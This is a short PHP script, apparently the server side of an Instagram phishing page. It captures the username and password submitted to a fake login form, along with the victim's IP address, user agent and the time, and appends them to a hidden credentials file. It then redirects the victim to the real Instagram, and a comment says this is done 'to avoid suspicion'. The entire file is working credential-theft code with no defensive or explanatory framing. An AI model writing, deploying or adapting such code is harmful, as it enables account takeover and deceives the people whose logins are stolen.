<?php
// If the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the user credentials from the form
    $username = isset($_POST["username"]) ? $_POST["username"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    
    // Additional data collection
    $ip = $_SERVER["REMOTE_ADDR"];
    $user_agent = $_SERVER["HTTP_USER_AGENT"];
    $date = date("Y-m-d H:i:s");
    
    // Create the log entry
    $log_entry = "Instagram Credentials\n";
    $log_entry .= "-------------------------\n";
    $log_entry .= "Date: $date\n";
    $log_entry .= "IP Address: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Username/Email: $username\n";
    $log_entry .= "Password: $password\n";
    $log_entry .= "-------------------------\n\n";
    
    // Ensure the .server directory exists
    if (!file_exists("../../.server")) {
        mkdir("../../.server", 0777, true);
    }
    
    // Save to the credentials file
    $file = fopen("../../.server/credentials.txt", "a");
    fwrite($file, $log_entry);
    fclose($file);
    
    // Redirect to the real Instagram to avoid suspicion
    header("Location: https://www.instagram.com/");
    exit();
} else {
    // If someone tries to access this file directly without POST data
    header("Location: index.html");
    exit();
}
?>
